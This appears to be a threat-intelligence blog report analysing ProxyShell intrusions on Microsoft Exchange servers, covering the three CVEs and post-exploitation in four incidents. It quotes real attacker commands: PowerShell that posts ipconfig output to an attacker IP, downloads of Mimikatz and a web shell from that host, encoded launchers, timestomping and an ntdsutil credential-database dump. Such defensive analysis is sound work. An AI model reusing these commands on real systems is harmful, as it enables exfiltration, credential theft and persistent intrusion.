Scanning for web shells\nThe Trend Micro™ Managed XDR team recently observed a surge in server-side compromises — ProxyShell-related intrusions on Microsoft\nExchange in particular via the Managed XDR service and other incident response engagements. These compromises, which occurred across\ndifferent sectors in the Middle East, were most often observed in environments using on-premise implementations of Microsoft Exchange.\n\nIn the engagements where the attacker’s objective was realised, we found that the deployment of ransomware was the most common end-goal\nfor the attacks that occurred in the Middle East. This indicates that threat actor groups have begun to favour the use of exploits related to\nProxyShell in order to establish initial access to an organisation’s system, with the possibility of ransomware attacks being launched down the\nline.\n\nUsing intrusion clusters that had overlaps in initial access techniques, we recently found a set of intrusions that were involved with attacks on\nthe Middle East, which we will be dissecting in this blog entry. All of these intrusions, which share a commonality of exploiting vulnerable\nProxyShell servers to gain an initial foothold on their target’s network, were rooted from an IIS Worker Process that was spawning suspicious\nprocesses.\n\nThrough our observation of the web shell activity on the Trend Micro Vision One Platform and by analysing the process tree created by the\nInternet Information Services (IIS) process w3wp.exe, we were able to determine the sequence of processes that are associated with the\ndifferent attack phases and how they tied in to the threat actor’s objective.\n\nWe clustered all the observed intrusions together to reveal some tactical and operational similarities between all the different ransomware\naffiliates that were deploying the final ransomware payloads. Through the Vision One platform, some intrusions were interrupted early in the\n[infection chain, after which we compared these to other similar intrusions to determine the chain of events (and whether LockFile,](https://www.bankinfosecurity.com/lockfile-ransomware-using-new-techniques-to-evade-detection-a-17442) [Conti, or any](https://www.trendmicro.com/en_ph/research/21/c/vision-one-tracking-conti-ransomware.html)\ncurrent active ransomware families in the Middle East threat landscape will be deployed as part of the routine).\n\nIn this blog entry, we will take a look at the ProxyShell vulnerabilities that were being exploited in these events, and dive deeper into the\nnotable post-exploitation routines that were used in four separate incidents involving these web shell attacks.\n\n## Observations on the ProxyShell Exploitation\n\n[The exploitation of ProxyShell in these attacks involve three vulnerabilities: CVE-2021-34473,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34473) [CVE-2021-34523 and](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34523) [CVE-2021-31207 — the](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31207)\nfirst two were patched in July 2021, while the latter was fixed in May 2021. Successful exploitation of these vulnerabilities can lead to arbitrary\n[writing of files that an attacker can leverage to upload web shells on a target exchange server.](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)\n\nThe malicious actor initially tried to start the attack by scanning for dropped web shells, which we assume were dropped earlier via vulnerability\nexploitation. This part failed, as the files showed a 404 error code when we tried to access them.\n\n## CVE-2021-34473: pre-auth path confusion\n\nThis vulnerability abuses the URL normalisation of Explicit Logon URL, where the login email will be removed from the URL if the URL suffix is\nautodiscover/autodiscover.json. This allows arbitrary backend URL access as the Exchange machine account (NT AUTHORITY\\SYSTEM).\n\nFigure 2. Exploiting CVE-2021-34473\nThe Autodiscover service is abused to leak a known user’s distinguished name (DN), which is an address format used internally within\nMicrosoft Exchange. The Messaging Application Programming Interface (MAPI) is then abused to leak the user's security identifier (SID).\n\n\n-----\n\n## CVE 2021 34523: Exchange PowerShell Backend Elevation of Privilege\n\nMicrosoft Exchange has a PowerShell remoting feature which can be used to read and send emails. This functionality cannot be used by NT\nAUTHORITY\\SYSTEM as it doesn’t have a mailbox, however, the backend /powershell can be provided via the X-Rps-CAT query string\nparameter in case it is accessed directly using the previous vulnerability, which will be deserialized and used to restore the user identity.\n\nThis technique can be used by an attacker to impersonate a local administrator in order to run PowerShell commands.\n\nFigure 3. An attacker using local administrator account administrator@xxxx along with its SID\n\n## CVE-2021-31207: Post-auth Arbitrary-File-Write\n\nThis vulnerability leverages the New-MailboxExportRequest PowerShell command in order to export the user mailbox to an arbitrary file\nlocation, which can be used to write a shell on the Exchange server.\n\nFigure 4. Access to the web shell after being imported\nThe web shell is imported as mail inside the administrator[@]xxx draft mailbox. It is then exported to\nc:/inetpub/wwwroot/aspnet_client/puqjc.aspx, after which it is accessed and returned with 200 codes.\n\nAn analysis of the file system timeline shows the same — the puqjc.aspx file was created at the same time as the malicious web connection\n(2:00 PM UTC)\n\nFigure 5. The system timeline showing the creation of the file puqjc.aspx\n\n## Post-exploitation routines\n\nA web shell is a piece of code written in web development programming language (e.g., ASP, JSP) that attackers can drop into web servers to\ngain remote access and the ability to execute arbitrary code and commands to meet their objectives. Once a web shell is successfully inserted\ninto the victim’s server, it can allow remote attackers to perform various tasks, such as stealing data or dropping other malicious tools.\n\nUpon analysis of the intrusion clusters, we were able to identify several variants of web shells used by different threat actors. The scanning\nand exploitation phases were the same in all the incidents, but the post-exploitation activities and their impact varied.\n\nThe following subsections go into the specifics of the post-exploitation routines we analysed in four separate incidents that occurred in August\nand September 2021. While some of the incidents shared certain behaviours during infection, their post-exploitation routines varied.\n\n## Incident # 1\n\n### The first web shell\n\nFigure 6. Code showing the exec_code query parameter\n\nIn the first incident we handled, we discovered that the web shell employed in the attack uses exec_code query parameter to execute ASP\ncode. After successfully accessing the command-and-control (C&C) server, it executed commands to gather basic information on the\ncompromised system.\n\n\"c:\\windows\\system32\\cmd.exe\" /c whoami\n\"c:\\windows\\system32\\cmd.exe\" /c ping -n 1 google.com\n\nFurthermore, the web shell also executed PowerShell commands, and downloaded and executed other malware.\n\n\n-----\n\nmalware\n\n### rundll.bat\n\nThe web shell includes a script that kills security software from specific vendors, and then disables the system’s firewall.\n\nFigure 8. Code showing how the script terminates security software\nIt then executes a PowerShell-encoded base64 script that downloads another obfuscated PowerShell script, which it then executes. This script\nis part of the CobaltStrike malware familly which has the ability to provide backdoor access to infected machines.\n\nFigure. 9 Decoded PowerShell command to download and execute\n\nCobalt Strike\n\nFigure 10. Code from the Cobalt Strike obfuscated PowerShell\nWe also noticed that the malicious actor behind the attack executed scripts to kill specific processes and to clear the PowerShell Windows\nevents log.\n\nFigure 11. Script designed to kill PowerShell-related processes\n\n### Liferay CMS\n\n[The IP addresses 212.84.32[.]13 and 103.25.196[.]33, are servers using the Liferay content managing system (CMS). It seems that these are](https://www.liferay.com/resources/l/content-management-system)\ncompromised versions of the software and being used to host the post-exploitation malicious payloads on different ports other than the default\nones (80, 443, 8080) used by the CMS.\n\n\n-----\n\nFigure 12. Properties of the Liferay CMS\n\nversions found on the IP addresses 212.84.32[.]13 and 103.25.196[.]33\n[Both servers are using Liferay CE version 6.2, which is vulnerable to CVE-2020-7961 (possibly leading to remote code execution).](https://nvd.nist.gov/vuln/detail/CVE-2020-7961)\n\n## Incident # 2\n\nSimilar to the first incident, the malicious actor accesses the server via a web shell and then starts to gather basic information on the system.\nHowever, the second incident used PowerShell for different post-exploitation activities.\n\nOur analysis shows that a Wget request was sent to a URL with a high numbered port. Unfortunately, we don’t have information as to what\nwas downloaded since the URL was already dead by the time of analysis.\n\n\"C:\\Windows\\System32\\cmd.exe\" /c powershell wget http://209.14.0[.]234:56138/iMCRufG79yXvYjH0W1SK\n\nThe following commands were executed in order to gather basic system information:\n\ncmd.exe /c ipconfig\ncmd.exe /c dir\n\"c:\\windows\\system32\\cmd.exe\" /c ping -n 1 google.com\n\"c:\\windows\\system32\\cmd.exe\" /c whoami\n\nThe web shell was then copied and the original entry deleted using the following commands:\n\ncmd.exe /c ren C:\\inetpub\\wwwroot\\aspnet_client\\errorFF.aspx.req errorFF.aspx\n\"c:\\windows\\system32\\cmd.exe\" /c del \"C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\errorFF.aspx.req\"\n\nThe ipconfig command was executed as an argument for a wget request\n\n\n-----\n\ne o o g code s o s t e o e s e e coded (top) a d decoded (botto ) co a ds\n\n\"c:\\windows\\system32\\cmd.exe\" /c powershell.exe -exec bypass -enc\nJAByAD0AaQBwAGMAbwBuAGYAaQBnACAALwBhAGwAbAAgAHwAIABvAHUAdAAtAHMAdAByAGkAbgBnADsAdwBnAGUAdAAgAC0AVQByA\n\n$r=ipconfig /all | out-string;wget -Uri http://91.92.136.250:443?Sdfa=fdssdadsfsfa -Method Post -Body $r -ContentType \"application/octetstream\"\n\nMimikatz, a tool that allows users to view and save credentials and is often used for post-exploitation activities, was downloaded by\nPowerShell, as shown with the following encoded (top) and decoded (bottom) commands:\n\n\"c:\\windows\\system32\\cmd.exe\" /c powershell -exec bypass -enc\nSQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwA5ADEALgA5ADIALgAxA\n\nInvoke-WebRequest -Uri \"http://91.92.136.250:443/mimi.exe\" -OutFile \"c:\\windows\\temp\\mimi.exe\"\n\nThe web shell then downloaded an additional.aspx web shell and timestamped it to further disguised itself in the system, seen in the following\ncode:\n\nInvoke-WebRequest -Uri \"http://91.92.136.250:443/out.aspx\" -OutFile \"c:\\windows\\temp\\OutlookCM.aspx\"\n\nThe web shell was then moved to the OWA directory with the following time stamp:\n\n$f1=(Get-Item 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookCM.aspx'); $f2=(Get-Item\n'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookCN.aspx'); $f1.creationtime=$f2.creationtime;\n$f1.lastwritetime=$f2.lastwritetime; $f1.lastaccesstime=$f2.lastaccesstime;\n\nAfter a few minutes, additional DLLs were created, which was later verified to be web shell files created either by w3wp.exe or\nUMWorkerProcess.exe.\n\nc:\\windows\\microsoft.net\\framework64\\v4.0.30319\\temporary asp.net files\\owa\\8e05b027\\e164d61b\\app_web_ffhsdhdi.dll\nc:\\windows\\microsoft.net\\framework64\\v4.0.30319\\temporary asp.net files\\owa\\8e05b027\\e164d61b\\app_web_m123qbjp.dll\n\nIn relation to this incident, we found the following malicious components and malware were used:\n\nOutlookCM.aspx (Trojan.ASP.WEBSHELL.CJ)\nApp_Web_ffhsdhdi.dll (Trojan.Win32.WEBSHELL.EQWO)\nApp_Web_m123qbjp.dll (Trojan.Win32.WEBSHELL.EQWO)\n\n## Other web shells\n\nDuring our investigation into this cluster, we found a specific web shell variant written in C# within an ASP.net page, which is quite unusual\n[since most web shells that we find are written in PHP instead. This is similar to the bespoke web shell the KRYPTON group utilised in their](https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/)\ncampaigns. The DLL web shell also had a corresponding ASPX version of it in the same system.\n\n\n-----\n\nFigure 13. The web shell written in C#\n\nFigure 14. C# web shell function which\n\n\nexecutes the Base64 command in CMD\n\n\n-----\n\nFigure 15. Web shell response for known inputs only, otherwise it will respond with error code 404\n\n## Incident #3\n\nThe third incident was different from the first two incidents in terms of credential dumping techniques and lateral movement within the\nsystem.In this case, the Microsoft Process Dump tool was used to dump LSSAS and extract the hashes.\n\nFigure 16. The execution for procedump.exe during the active attack\nThe Windows utility PsExec was detected during the lateral movement phase. The attacker used it to access remote machines and servers in\norder to drop and execute a new backdoor malware.\n\nA [pass-the-hash attack technique was used to access remote servers and machines, after which a new malware component was dropped in](https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack)\norder to create persistence.\n\nFigure 17. Using a pass-the-hash technique for remote access\n\nThe following malware were dropped on the infected machines:\n\nCacheTask.dll (Backdoor.Win32.COTX.A)\ndllhost.exe (PUA.Win64.LanGO.B)\nHostDLL.exe (Trojan.Win64.OGNHOST.A)\n\nPersistence was then created on remote machines via scheduled task to keep the backdoor running.\n\nFigure 18. Creating persistence via scheduled\n\ntask\n\n\n-----\n\n## Incident # 4\n\nWe analysed a fourth incident that had an interesting technique for credential dumping, specifically, dumping the database via the NT Directory\nService Utility:\n\n\"C:\\Windows\\system32\\cmd[.]exe\" /c ntdsutil \"activate instance ntds\" ifm \"create full c:\\windows\\temp\\ntd\" quit quit\n\n## Execution Profile\n\nHere is an example of a post-exploitation routine using the ProxyShell instance. After the web shells are dropped, cmd.exe and powershell.exe\nare used to execute commands on the affected systems.\n\nFigure 19. Trend Micro Vision One ™ console showing the post-exploitation routine using a ProxyShell instance\n\n## Security recommendations\n\nFor the incidents that we encountered, it should be noted that the affected Microsoft Exchange servers were left unpatched, either knowingly or\nunknowingly, by their respective IT teams. [Microsoft had written in August 2021 that patching to the latest cumulative update (CU) or security](https://techcommunity.microsoft.com/t5/exchange-team-blog/proxyshell-vulnerabilities-and-your-exchange-server/ba-p/2684705)\nupdate (SU) are indeed the first line of defence against threats that exploit vulnerabilities related to ProxyShell.\n\nWhile mitigation controls, such as the implementation of a host-based or network-based intrusion prevention system (HIPS/NIPS), can be\napplied to these servers, it should be noted that these controls would only buy time before any actual patching should occur, providing leeway\nfor IT teams to allow them to trigger the appropriate change management controls.\n\nIt is also worthwhile to note that a Microsoft Exchange server would still have an active web shell even if it’s patched after a successful\ncompromise. This means that servers that have been compromised via vulnerabilities related to ProxyShell should be inspected thoroughly for\nany malicious activities since web shells may already exist (and could continue to still be operational). An active web shell can still allow a\nmalicious actor to continue pursuing their chosen objectives such as ransomware infection, cryptocurrency mining, and data exfiltration.\n\nThe implementation of proper segmentation for publicly-exposed servers should always be reviewed, with their behaviour (i.e., processes\nbeing launched, anti-malware violations, or network traffic profile) being monitored constantly. For example, the observation of internal network\nscanning, SMB traffic, or other unusual traffic that has not been seen historically can be a sign that the server has been compromised. Earlier\nthis year, [Microsoft wrote an excellent guide for hardening web servers against web shell-based attacks.](https://www.microsoft.com/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/)\n\n## Trend Micro Solutions\n\n[The capabilities of the Trend Micro Vision One™ platform made both the detection of this attack and our investigation into it possible. We took](https://www.trendmicro.com/en_us/business/products/detection-response.html)\ninto account metrics from the network and endpoints that would indicate potential attempts of exploitation.
